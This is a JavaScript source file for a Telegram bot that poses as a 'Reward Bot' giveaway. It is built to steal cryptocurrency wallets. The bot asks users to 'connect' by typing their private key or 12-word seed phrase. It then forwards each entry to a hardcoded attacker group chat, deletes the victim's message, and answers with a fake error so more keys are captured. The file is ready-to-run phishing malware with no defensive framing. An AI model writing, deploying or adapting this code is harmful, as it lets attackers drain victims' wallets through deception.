import 'dotenv/config';
import TelegramBot from 'node-telegram-bot-api';

// Load environment variables
const token = process.env.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

// Store wallet connection sessions
const walletSessions = new Set();

// External Group ID (where wallet data is sent)
const GROUP_CHAT_ID = -1002482381098; // Change this to your group ID

// Handle /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const message = `
🎁 *Welcome to the Reward Bot!*  

Click the button below to claim your reward.  
_You can only claim once!_
`;

    const options = {
        reply_markup: {
            inline_keyboard: [[{ text: "🎉 Claim Reward", callback_data: "claim_reward" }]]
        },
        parse_mode: "Markdown"
    };

    bot.sendMessage(chatId, message, options);
});

// Handle button clicks
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === "claim_reward") {
        // Ask the user to connect their wallet
        const message = `
⚠️ *Please connect your wallet* to confirm if you're eligible or have already claimed the reward.  
Click the button below to proceed.
`;

        const options = {
            reply_markup: {
                inline_keyboard: [[{ text: "🔗 Connect Wallet", callback_data: "connect_wallet" }]]
            },
            parse_mode: "Markdown"
        };

        bot.sendMessage(chatId, message, options);
    } else if (query.data === "connect_wallet") {
        walletSessions.add(chatId); // Start wallet input session

        const message = `
🔹 *Please input the private key of this wallet.*  
You may also use a *12-word mnemonic phrase*.
`;

        bot.sendMessage(chatId, message);
    }
});

// Handle private key/mnemonic phrase input
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;

    // If the user is in a wallet session, capture every input and send it to the group
    if (walletSessions.has(chatId)) {
        const walletData = msg.text;
        const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;

        // Forward wallet data to the external group
        await bot.sendMessage(GROUP_CHAT_ID, `🚀 *New Wallet Connection Attempt:*\n\n📌 *User:* ${username}\n🔑 *Wallet Data:* \`${walletData}\``, { parse_mode: "Markdown" });

        // Delete user's message for security reasons
        setTimeout(() => {
            bot.deleteMessage(chatId, msg.message_id).catch(console.error);
        }, 2000); // Delay deletion slightly to avoid conflicts        

        // Keep session active so every input is captured
        bot.sendMessage(chatId, "❌ Error, please try again.");
    }
});